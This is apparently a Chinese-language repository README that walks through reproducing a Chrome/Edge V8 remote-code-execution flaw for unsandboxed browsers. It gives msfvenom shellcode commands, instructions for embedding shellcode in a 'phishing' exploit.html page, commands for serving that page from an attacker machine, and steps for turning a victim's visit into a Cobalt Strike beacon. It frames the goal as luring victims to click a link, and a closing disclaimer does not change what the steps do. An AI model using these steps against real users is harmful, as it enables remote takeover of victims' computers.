# Chrome-0day
## 漏洞介绍

Google Chrome是由Google开发的免费网页浏览器。经测试，此漏洞影响 Chrome 最新正式版（89.0.4389.128）以及基于Chromium内核的Microsoft Edge正式版（89.0.774.76）。攻击者可通过构造特制web页面并诱导受害者访问来利用此漏洞获得远程代码执行。

Chrome一直是很多用户使用的浏览器，最新出来了一个[Chrome 0Day](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247493386&idx=1&sn=168b3a6d23acb04b144bbc4e0ec44e8a&scene=21#wechat_redirect) ，然后我这边已经成功复现，配合这个0day，可以执行任意命令，不过前提条件是需要chrome开启--no-sandbox无沙盒模式，我们可以生成一个链接让受害者点击直接上线Cobalt Strike。

## 影响范围

Google Chrome <= 89.0.4389.128

基于Chromium内核的Microsoft Edge <= 89.0.774.76

其他基于V8引擎的浏览器

目前90.0.4430.72 (正式版本)也受影响。

但最新版90.0.4430.85 (正式版本)不受影响。

目前测试32位Chrome所有版本都不受影响。

## 漏洞复现过程

测试环境：

靶机

IP：192.168.43.233

Windows 10 x64

Chrome 90.0.4430.72 (正式版本) x64

攻击机

IP：192.168.43.232

MacBookPro MacOS Big Sur 版本 11.2.3

Cobalt Strike 4.2

## 1. 执行系统命令

### 1.1 生成shellcode代码

#### 弹出计算器的shellcode生成命令：

**64位操作系统：**

```
msfvenom -a x64 -p windows/x64/exec CMD="calc" EXITFUNC=thread -f num
```

**32位操作系统：**

```
msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num
```

*（当然也可以换成其他系统命令，注意这里的架构要和浏览器所在操作系统的保持一致，一般为64位）*

### 1.2 制作html钓鱼文件


将生成的代码放入exploit.html中shellcode[]中。

#### 1.2.1 方式一

浏览器关闭沙盒并打开网页，可以看到已经成功执行计算器命令。

```
"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-sanbox file:///C:/chrome0day/exploit.html
```
<img src="$imgs/image-20210419212729010.png" alt="image-20210419212729010" style="zoom:50%;" />

#### 1.2.2 方式二

在攻击机当前目录下用python或kali自带的apache2开启一个http服务。

python3.x版本：

```
python3 -m http.server 80
```

python2.x版本：

```
python -m SimpleHttpServer 80
```

apache2

```
sudo systemctl start apache2
```

用关闭沙盒的Chrome浏览器访问以下链接，可以看到已经成功执行计算器命令。

http://192.168.43.232/exploit.html

<img src="$imgs/image-20210419213214973.png" alt="image-20210419213214973" style="zoom:50%;" />

### 1.2.3 关闭沙盒方法：

**命令方式：**

chrome.exe --no-sandbox

**手动方式：**

在快捷方式属性中目标后面添加" --no-sandbox",注意引号后有一个空格。

<img src="$imgs/image-20210419212821226.png" alt="image-20210419212821226" style="zoom:33%;" />



## 2. 利用Cobalt Strike 上线

### 2.1 Cobalt Strike开启监听

**2.1.1 启动服务端：**

```
sudo ./teamserver 192.168.43.232 1234
```

![image-20210419204459251]($imgs/image-20210419204459251.png)

出现以上页面说明启动成功。

**2.1.2 启动客户端：**

<img src="$imgs/image-20210419204751453.png" alt="image-20210419204751453" style="zoom:50%;" />

**2.1.3 启动监听器：**

<img src="$imgs/image-20210419210046476.png" alt="image-20210419210046476" style="zoom:50%;" />

### 2.2 Cobalt Strike生成payload

**2.2.1 按照以下步骤生成payload.c文件，注意这里勾选x64。**

<img src="$imgs/image-20210419210123713.png" alt="image-20210419210123713" style="zoom: 33%;" />

<img src="$imgs/image-20210419210355208.png" alt="image-20210419210355208" style="zoom: 33%;" />

**2.2.2 用notepad++打开payload.c文件，ctrl+H替换"\\"为",0"，点击全部替换。**

![image-20210419210638146]($imgs/image-20210419210638146.png)

**2.2.3 将引号里的代码复制到exploit.html文件的shellcode[]中，注意：shellcode[]没有换行，包括所有代码都是在一行的。**

![image-20210419212051276]($imgs/image-20210419212051276.png)

**2.2.4 打开没有开启沙盒的Chrome浏览器访问：http://192.168.43.232/exploit.html**

![image-20210419210849819]($imgs/image-20210419210849819.png)

**2.2.5 查看Cobalt Strike 即可上线成功，进入beacon，可以执行命令等等。**

![image-20210419210953419]($imgs/image-20210419210953419.png)



**至此Chrome-0day复现完成，仅供参考，严禁非法破坏他人系统，严格遵守《中华人民共和国网络安全法》，如有违反，后果自负，与作者无关。**
